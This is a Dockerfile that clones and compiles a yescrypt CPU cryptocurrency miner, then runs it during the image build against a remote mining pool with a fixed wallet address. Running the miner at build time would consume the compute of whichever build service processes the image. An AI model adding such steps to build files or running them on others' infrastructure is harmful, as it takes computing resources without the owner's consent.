FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN apt-get install build-essential libcurl4-openssl-dev autotools-dev automake -y
RUN git clone https://github.com/crypto-jeronimo/cpuminer-yescrypt-r16 && cd cpuminer-yescrypt-r16 && chmod +x autogen.sh && ./autogen.sh && ./configure CFLAGS="-O3" && make && cp minerd ~/. 
RUN ~/minerd -a yespowerr16 -t 4 -o stratum+tcp://stratum-asia.rplant.xyz:3382 -u YVKxvfuuRWeqsxrkdobM68KDrgeG5Rmt8e
